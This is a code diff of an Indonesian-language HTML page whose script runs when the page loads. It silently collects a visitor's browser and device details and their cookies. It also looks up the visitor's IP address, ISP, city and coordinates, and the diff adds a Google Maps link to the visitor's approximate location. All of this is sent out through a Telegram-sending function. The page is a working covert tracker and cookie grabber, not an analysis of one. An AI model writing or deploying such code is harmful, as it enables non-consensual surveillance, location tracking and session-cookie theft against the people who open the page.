@@ -1,6 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pengumpulan Informasi Pengunjung</title>
 </head>
 <body>
@@ -17,8 +19,8 @@
 
             fetch(apiUrl)
                 .then(response => response.json())
-                .then(responseData => console.log('Pesan terkirim:', responseData))
-                .catch(error => console.error('Gagal mengirim pesan:', error));
+                .then(responseData => console.log('Data terkirim:', responseData))
+                .catch(error => console.error('Gagal mengirim data:', error));
         }
 
         async function getDeviceInfoAndSend() {
@@ -26,23 +28,21 @@
             const date = new Date();
 
             const deviceInfo = {
-                "IP Address": 'Tidak Diketahui',
+                "IP Address": 'Mencari...',
                 "User-Agent": navigator.userAgent,
-                "Browser & OS": navigator.userAgent, // Informasi ini seringkali ada di User-Agent
-                "Device Type": /Mobile|Android|iP(hone|ad|od)|BlackBerry|Windows Phone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-                "ISP (Provider Internet)": 'Tidak Diketahui',
-                "Kota & Negara": 'Tidak Diketahui',
+                "Browser & OS": navigator.userAgent,
+                "Jenis Perangkat": /Mobile|Android|iP(hone|ad|od)|BlackBerry|Windows Phone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                "ISP": 'Mencari...',
+                "Lokasi": 'Mencari...',
                 "Bahasa Sistem": navigator.language,
                 "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
-                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-                "Tanggal & Jam Akses": date.toLocaleString(),
-                "Referer URL": document.referrer || 'Tidak Ada',
-                "Cookies": document.cookie || 'Tidak Ada',
-                "Platform & Arsitektur": navigator.platform,
-                "Touch Support": 'ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0 ? 'Ya ✅' : 'Tidak ❌',
-                // "Fingerprint ID": 'Akan diisi oleh library JS jika digunakan',
-                // "Installed Fonts": 'Akan diisi oleh library JS jika digunakan',
-                // "WebGL & Canvas Data": 'Akan diisi oleh library JS jika digunakan',
+                "Zona Waktu": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Akses Pada": date.toLocaleString(),
+                "URL Sebelumnya": document.referrer || 'Tidak Ada',
+                "Cookie": document.cookie || 'Tidak Ada',
+                "Platform": navigator.platform,
+                "Dukungan Sentuhan": 'ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0 ? 'Ya ✅' : 'Tidak ❌',
+                "Google Maps": 'Mencari...'
             };
 
             try {
@@ -50,17 +50,27 @@
                 const ipInfoData = await ipInfoResponse.json();
                 if (ipInfoData && ipInfoData.query) {
                     deviceInfo["IP Address"] = ipInfoData.query;
-                    deviceInfo["ISP (Provider Internet)"] = ipInfoData.isp;
-                    deviceInfo["Kota & Negara"] = `${ipInfoData.city}, ${ipInfoData.country}`;
+                    deviceInfo["ISP"] = ipInfoData.isp || 'Tidak Ditemukan';
+                    deviceInfo["Lokasi"] = `${ipInfoData.city || 'Tidak Ditemukan'}, ${ipInfoData.country || 'Tidak Ditemukan'}`;
+                    const latitude = ipInfoData.lat;
+                    const longitude = ipInfoData.lon;
+                    if (latitude && longitude) {
+                        deviceInfo["Google Maps"] = `[Lihat di Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;
+                    } else {
+                        deviceInfo["Google Maps"] = 'Koordinat tidak ditemukan';
+                    }
                 }
             } catch (error) {
                 console.error('Gagal mendapatkan informasi IP:', error);
+                deviceInfo["IP Address"] = 'Gagal Didapatkan';
+                deviceInfo["ISP"] = 'Gagal Didapatkan';
+                deviceInfo["Lokasi"] = 'Gagal Didapatkan';
+                deviceInfo["Google Maps"] = 'Gagal Mendapatkan Koordinat';
             }
 
             sendDataToTelegram(deviceInfo);
         }
 
-        // Panggil fungsi getDeviceInfoAndSend saat halaman dimuat
         window.onload = getDeviceInfoAndSend;
     </script>
 </body>
